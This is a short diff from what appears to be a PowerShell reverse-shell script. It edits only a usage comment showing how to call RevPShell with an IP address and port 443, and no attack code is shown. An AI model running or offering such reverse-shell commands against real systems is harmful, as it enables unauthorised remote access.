@@ -91,7 +91,7 @@ function RevPShell
         Write-Error $_
     }
  # RevPShell -Reverse -IPAddress <IP> -Port <port> 
- # i.e. RevPShell -Reverse http://127.0.0.1 -Port 443
+ # i.e. RevPShell -Reverse 127.0.0.1 -Port 443
 }
 
 
